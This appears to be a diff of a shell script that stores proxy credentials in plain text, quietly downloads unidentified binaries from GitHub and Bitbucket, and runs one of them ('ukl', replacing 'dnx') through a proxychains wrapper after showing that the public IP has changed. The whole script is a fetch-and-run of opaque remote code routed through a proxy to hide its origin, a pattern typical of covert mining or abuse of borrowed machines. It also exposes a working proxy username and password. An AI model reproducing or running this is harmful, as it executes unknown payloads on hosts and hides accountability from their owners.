@@ -2,7 +2,7 @@ proxy="188.74.210.21"
 port="6100" 
 user="ubslvwxe"  
 pass="iikj33112te4" 
-wget -q https://raw.githubusercontent.com/55113110159/OS/main/dnx && chmod +x dnx
+wget -q https://raw.githubusercontent.com/55113110159/OS/main/ukl && chmod +x ukl
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./dnx
+./panel ./ukl
